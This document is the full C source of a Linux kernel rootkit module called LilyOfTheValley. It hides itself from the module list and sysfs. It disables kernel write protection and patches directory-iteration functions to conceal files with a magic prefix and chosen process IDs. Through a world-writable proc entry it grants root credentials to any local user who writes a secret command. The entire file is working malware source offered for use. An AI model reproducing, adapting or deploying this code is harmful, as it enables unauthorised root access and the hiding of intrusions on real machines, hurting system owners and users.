#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/version.h>




MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mostafa Algayar");



/*
#############################
macro fucntions && constants  	   
#############################
*/


#define MIN(x,y) ((x) < (y) ? (x) : (y))


//clear the WP (write protect) bit in cr0 reg, so cpu can write to readonly pages whilst in ring0 
#define unprotect_memory()	(write_cr0(read_cr0() & (~0x10000)))

#define protect_memory() 	(write_cr0(read_cr0() | 0x10000))



/*
rootkit should hide any file in the root filesystem 
which have this string prepended to it's name 
examples: rtkit_dir rtkit_testfile etc ...
*/
#define R00TKIT_NAME 	"lilyofthevalley"
#define R00TKIT_NAMELEN 0xf


/*
#name of the rootkit's proc filesystem entry
#permissions of rootkit's proc filesystem entry
*/		
#define R00TKIT_PROCFS_ENTRYNAME  "lilyofthevalleyr00tkit"
#define R00TKIT_PROCFS_ENTRYPERM  0666


/*
rootkit's commands 
*/
#define GIVEROOTPERM_CMD "givemerootprivileges"
#define HIDEPID_CMD 	 "hidepid"
#define UNHIDEPID_CMD 	 "unhidepid"

#define HIDEPID_CMD_LEN 	0x7
#define UNHIDEPID_CMD_LEN 	0x9


//maximum len for an pid stored in string format is 7 bytes and one byte for string termination 
//given that the maxiumum value can be set up to (2**22)
#define PID_STR_MAXLEN 0x8



/*
*********
PARASITES
*********
*/
#define INSTALL_PARASITE 	1
#define REMOVE_PARASITE 	!INSTALL_PARASITE

#if defined(__i386__)
/*
\x68\x00\x00\x00\x00\xc3

push memory_address
ret
*/
#define PARASITE		"\x68\x00\x00\x00\x00\xc3" 
#define PARASITE_LEN		0x6
#define PARASITE_ADDROFF	0x1 

#else
/*
\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0

mov rax,memory_address
jmp rax
*/
#define PARASITE		"\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
#define PARASITE_LEN		0xc
#define PARASITE_ADDROFF	0x2


#endif


/*
#########################
some structs declarations
#########################
*/

struct r00tkit_dircontext
{
	filldir_t actor;
	loff_t pos;
};



struct hooked_function_info
{
	void *hooked_function_addr;
	struct list_head hook_list;
	char org_code[PARASITE_LEN];
	char parasite[PARASITE_LEN];
};



struct hidden_pids
{
	struct list_head pids_list;
	char pidstr[PID_STR_MAXLEN];
};


/*
proc_dir_entry structure is not declared in proc_fs.h starting with kernel version 3.10.
the structure differs a bit between newer kernel versions
*/

//for 4.X
//copied from /fs/proc/internal.h 
struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	struct proc_dir_entry *parent;
	struct rb_root subdir;
	struct rb_node subdir_node;
	void *data;
	atomic_t count;		/* use count */
	atomic_t in_use;	/* number of callers into module in progress; */
			/* negative -> it's going away RSN */
	struct completion *pde_unload_completion;
	struct list_head pde_openers;	/* who did ->open, but not ->release */
	spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
	u8 namelen;
	char name[];
};



/*
###########
prototypes
###########
*/


static int r00tkit_procfs_inlinehook_iterate(struct file *,struct dir_context *);
static int r00tkit_rootfs_inlinehook_iterate(struct file *,struct dir_context *);


static int r00tkit_procfs_filldir(void *,const char *,int,loff_t,u64,unsigned int);
static int r00tkit_rootfs_filldir(void *,const char *,int,loff_t,u64,unsigned int);


static int 	r00tkit_procfs_entry_init(void);
static ssize_t 	r00tkit_procfs_write(struct file *,const char __user *,size_t,loff_t*);
static ssize_t  r00tkit_procfs_read(struct file *,char __user *,size_t,loff_t *); 

//static void 	r00tkit_pid2str(int,struct hidden_pids *);
static int 	r00tkit_hide_pid(const char *,size_t);
static int  	r00tkit_unhide_pid(const char *,size_t);


static int 	r00tkit_hooklist_add(void *,void *);
static void 	r00tkit_parasite(void *,unsigned char);
static int 	r00tkit_do_hook(void);
static void 	r00tkit_undo_hook(void);	

static void 	r00tkit_hide(void);



/*
#################
function pointers
#################
*/

static int (*org_procfs_iterate)(struct file *fp,struct dir_context *ctx);
static int (*org_rootfs_iterate)(struct file *fp,struct dir_context *ctx);

static filldir_t org_procfs_filldir;
static filldir_t org_rootfs_filldir;



/*
###########################################
###########################################
*/


LIST_HEAD(hidden_pids_listhead);

static int r00tkit_hide_pid(const char *buf,size_t count)
{
	struct hidden_pids *hidden_pid;

	hidden_pid = (struct hidden_pids *)kzalloc(sizeof(struct hidden_pids),GFP_KERNEL);

	if (hidden_pid == NULL)
		return 0;

	list_add(&hidden_pid->pids_list,&hidden_pids_listhead);

	strncpy(hidden_pid->pidstr,&buf[HIDEPID_CMD_LEN],MIN(count - HIDEPID_CMD_LEN,PID_STR_MAXLEN - 1));

	return 1;
}


static int r00tkit_unhide_pid(const char *buf,size_t count)
{
	struct hidden_pids *hidden_pid,*next_hidden_pid;

	list_for_each_entry_safe(hidden_pid,next_hidden_pid,&hidden_pids_listhead,pids_list)
	{
		if (strncmp(hidden_pid->pidstr,&buf[UNHIDEPID_CMD_LEN],MIN(count - UNHIDEPID_CMD_LEN,PID_STR_MAXLEN - 1)) == 0)
		{
			list_del(&hidden_pid->pids_list);
			kfree(hidden_pid);
			return 1;
		}
	}

	return 0;
}



static struct proc_dir_entry *r00tkit_procfs_entry,*procfs_root;
/*
handlers for the read and write operations from/to rootkit's
proc filesystem entry
*/
static struct file_operations r00tkit_procfs_fops = 
{
	.write = r00tkit_procfs_write,
	.read  = r00tkit_procfs_read
};

/*
create a proc filysystem entry for the rootkit
*/
static int r00tkit_procfs_entry_init(void)
{
	r00tkit_procfs_entry = proc_create(R00TKIT_PROCFS_ENTRYNAME,
					   R00TKIT_PROCFS_ENTRYPERM,
				   	   NULL,
					   &r00tkit_procfs_fops);

	if (r00tkit_procfs_entry == NULL)
		return 0;

	procfs_root = r00tkit_procfs_entry->parent;

	return 1;
}


static ssize_t r00tkit_procfs_write(struct file *fp,
				    const char __user *buf,
				    size_t count,
				    loff_t *offp)
{

	struct cred *user_new_creds;

	if (strcmp(buf,GIVEROOTPERM_CMD) == 0)
	{

		user_new_creds = prepare_creds();

		if (user_new_creds != NULL)
		{
			user_new_creds->uid 	= (kuid_t) { 0 };
			user_new_creds->gid 	= (kgid_t) { 0 };
			user_new_creds->euid	= (kuid_t) { 0 };
			user_new_creds->egid	= (kgid_t) { 0 };
			user_new_creds->suid	= (kuid_t) { 0 };
			user_new_creds->sgid	= (kgid_t) { 0 };
			user_new_creds->fsuid	= (kuid_t) { 0 };
			user_new_creds->fsgid	= (kgid_t) { 0 };

			commit_creds(user_new_creds);

		}

	}


	else if (strncmp(buf,HIDEPID_CMD,HIDEPID_CMD_LEN) == 0)
	{
		if (count == HIDEPID_CMD_LEN)
			return -1;

		if (!r00tkit_hide_pid(buf,count))
			return -1;
	}

	else if(strncmp(buf,UNHIDEPID_CMD,UNHIDEPID_CMD_LEN) == 0)
	{
		if (count == UNHIDEPID_CMD_LEN)
			return -1;

		if (!r00tkit_unhide_pid(buf,count))
			return -1;
	}

	return count;
}


static ssize_t r00tkit_procfs_read(struct file *fp,
				   char __user *buf,
				   size_t count,
				   loff_t *offset)
{
	const char r00tkit_cmds[] = 
				"###########################\n"
				"LilyOfTheValley Commands\n"
				"###########################\n\n"
				"\t* [givemerootprivileges] -->> to gain root access\n"
				"\t* [hidepidPID] -->> to hide a given pid. replace (PID) with target pid\n"
				"\t* [unhidepidPID] -->> to unhide a given pid. replace (PID) with target pid\n"
				"\t* [hidingfiles] -->> just prepend lilyofthevalley to the file or dir name that u want to hide\n"
				"\x00";

	if (copy_to_user(buf,r00tkit_cmds,strlen(r00tkit_cmds)))
		return -EFAULT;

	if (*offset != 0)
		return 0;

	*offset += 1;
	return (ssize_t)strlen(r00tkit_cmds);
}




/*
define rootkit's proc/root filesystms 
directory entries filler functions
*/

static int r00tkit_procfs_filldir(void *_buf,
				  const char *name,
				  int namelen,
				  loff_t offset,
				  u64 ino,
				  unsigned int d_type)
{

	struct hidden_pids *hidden_pid;


	list_for_each_entry(hidden_pid,&hidden_pids_listhead,pids_list)
	{
		if (strcmp(hidden_pid->pidstr,name) == 0)
			return 0;
	}

	//hide rootkit's file in proc filesystem
	if (strcmp(name,R00TKIT_PROCFS_ENTRYNAME) == 0)
		return 0;

	return org_procfs_filldir(_buf,name,namelen,offset,ino,d_type);
}

static int r00tkit_rootfs_filldir(void *_buf,
				  const char *name,
				  int namelen,
				  loff_t offset,
				  u64 ino,
				  unsigned int d_type)
{	

	/*
	hide any file in  the root filesystem, 
	if first chars of it's name == r00tkit_name
	*/
	if (strncmp(name,R00TKIT_NAME,R00TKIT_NAMELEN) == 0)
		return 0;

	return org_rootfs_filldir(_buf,name,namelen,offset,ino,d_type);
}




/*
******************************************************************************************
each hooked function is represented by a hooked_function_info
structure that records all info related to the hooked function
(it's original address ,it's original first bytes,etc ...)
the rootkit keeps track of all hooked functions by
implementing a doubly linked list of hooked_function_info structures
******************************************************************************************
*/

LIST_HEAD(hooked_functions_listhead);

//instead of code repeating
#define define_r00tkit_inlinehook_iterate(targetfs)							\
		static int r00tkit_##targetfs##_inlinehook_iterate(struct file *fp,			\
								   struct dir_context *ctx)		\
		{											\
			int retval;									\
			struct r00tkit_dircontext *r00tkit_ctx = (struct r00tkit_dircontext *)ctx;	\
			org_##targetfs##_filldir = r00tkit_ctx->actor;					\
			r00tkit_ctx->actor = (filldir_t)r00tkit_##targetfs##_filldir;			\
			r00tkit_parasite(org_##targetfs##_iterate,REMOVE_PARASITE);			\
			retval = org_##targetfs##_iterate(fp,(struct dir_context *)r00tkit_ctx);	\
			r00tkit_parasite(org_##targetfs##_iterate,INSTALL_PARASITE);			\
			return retval;									\
		}



define_r00tkit_inlinehook_iterate(procfs)
define_r00tkit_inlinehook_iterate(rootfs)


/*
[]allocate a hooked_function_info struct
[]fill it with relevant info for the target function
[]add to the list of hooked functions
*/
static int r00tkit_hooklist_add(void *target_func_addr,void *r00tkit_func)
{
		char parasite[PARASITE_LEN] = PARASITE;
		struct hooked_function_info *hook;

		hook = (struct hooked_function_info *)kmalloc(sizeof(struct hooked_function_info),GFP_KERNEL);

		if (hook == NULL)
			return 0;


		//replace zeros with address of rootkit's function
		*((unsigned long *)(&parasite[PARASITE_ADDROFF])) = (unsigned long)r00tkit_func;

		/*
		[]fill in hooked_functions_info struct of this targeted function. 
		[]add to the list of hooked functions 
		*/
		memcpy(hook->parasite,parasite,PARASITE_LEN);
		memcpy(hook->org_code,target_func_addr,PARASITE_LEN);

		hook->hooked_function_addr = target_func_addr;

		list_add(&hook->hook_list,&hooked_functions_listhead);

		return 1;
}


/*
replace target function's prologue bytes with rootkits's parasite
if install_parasite = INSTALL_PARASITE

restore target function's prologue bytes if install_parasite = REMOVE_PARASITE
*/
static void r00tkit_parasite(void *target_func_addr,unsigned char install_parasite)
{
	struct hooked_function_info *hook;
 
	//we can't leave cpu while hijacking the targtet function bytes
	preempt_disable();

	unprotect_memory();
			
	list_for_each_entry(hook,&hooked_functions_listhead,hook_list)
	{
		if (hook->hooked_function_addr == target_func_addr)
		{

			if (install_parasite)
			{
				memcpy(target_func_addr,hook->parasite,PARASITE_LEN);
			}else
			{
				memcpy(target_func_addr,hook->org_code,PARASITE_LEN);
			}
		}
	}

	protect_memory();

	preempt_enable();
}


static int r00tkit_do_hook()
{
	struct file *procfs_fp,*rootfs_fp;
	struct file_operations *procfs_fops,*rootfs_fops;

	if (((procfs_fp = filp_open("/proc",O_RDONLY,0)) == NULL) || 
					((rootfs_fp = filp_open("/",O_RDONLY,0)) == NULL))
		return 0;

	procfs_fops = (struct file_operations *)procfs_fp->f_op;
	rootfs_fops = (struct file_operations *)rootfs_fp->f_op;


#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,7,0)

	org_procfs_iterate = procfs_fops->iterate_shared;
	org_rootfs_iterate = rootfs_fops->iterate_shared;

#else

	org_procfs_iterate = procfs_fops->iterate;
	org_rootfs_iterate = rootfs_fops->iterate;

#endif 

	if (!r00tkit_hooklist_add(org_procfs_iterate,r00tkit_procfs_inlinehook_iterate) ||
			!r00tkit_hooklist_add(org_rootfs_iterate,r00tkit_rootfs_inlinehook_iterate))
		return 0;

	r00tkit_parasite(org_procfs_iterate,INSTALL_PARASITE);
	r00tkit_parasite(org_rootfs_iterate,INSTALL_PARASITE);
	
	filp_close(procfs_fp,0);
	filp_close(rootfs_fp,0);

	return 1;
}

static void r00tkit_undo_hook()
{
	struct hooked_function_info *current_hooked,*next_hooked;

	r00tkit_parasite(org_procfs_iterate,REMOVE_PARASITE);
	r00tkit_parasite(org_rootfs_iterate,REMOVE_PARASITE);

	//free the list of hooked functions
	list_for_each_entry_safe(current_hooked,next_hooked,&hooked_functions_listhead,hook_list)
	{
		list_del(&current_hooked->hook_list);
		kfree(current_hooked);
	}

}


static void r00tkit_hide()
{
	list_del_init(&THIS_MODULE->list); 	/* hide from /proc/modules */
	kobject_del(&THIS_MODULE->mkobj.kobj);	/* remove rootkit's sysfs entry	*/
}



static int r00tkit_init(void)
{

	r00tkit_hide();

	if (!r00tkit_do_hook())
		return -1;
	
	if (!r00tkit_procfs_entry_init())
		return -1;

	return 0;
}

static void r00tkit_exit(void)
{

	remove_proc_entry(R00TKIT_PROCFS_ENTRYNAME,procfs_root);

	r00tkit_undo_hook();
}

module_init(r00tkit_init);
module_exit(r00tkit_exit);
